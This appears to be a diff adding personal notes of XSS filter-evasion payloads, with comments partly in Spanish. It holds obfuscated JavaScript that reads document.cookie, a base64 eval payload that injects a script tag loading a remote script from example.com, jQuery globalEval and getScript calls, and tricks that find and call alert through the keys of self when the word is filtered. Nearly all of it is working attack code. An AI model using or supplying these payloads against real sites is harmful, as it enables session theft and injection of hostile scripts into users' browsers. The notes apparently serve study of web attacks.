@@ -1,0 +1,41 @@
+self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"])
+
+console.log("\x68\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21")
+#Hello World
+
+self["\x61\x6c\x65\x72\x74"](self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])
+#ALERT ENCODED
+
+
+self["\x65\x76\x61\x6c"](
+  self["\x61\x74\x6f\x62"](
+    "dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50\
+    c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyI\
+    HNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbn\
+    QoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGU\
+    oJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2Ny\
+    aXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6L\
+    y9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW\
+    5kQ2hpbGQoc2NyaXB0KTs="
+  )
+)
+
+with JQUERY:
+
+	self["$"]["globalEval"]("alert(1)");
+
+	self["\x24"]
+	["\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"]
+	("\x61\x6c\x65\x72\x74\x28\x31\x29"); 
+
+	self["$"]["getScript"]("https://example.com/my.js");
+
+	Object Keys method:
+		Object.keys(self) ---> Nos da la lista de objetos o como alternativa --> c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
+
+	##Si la palabra alert esta filtrada podemos utilizar un filtro con una funcion de callback asociada a una variable 
+
+	a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}}
+
+
+		self[Object.keys(self)[6]]("xdd") #Alert, funcion numero 6 
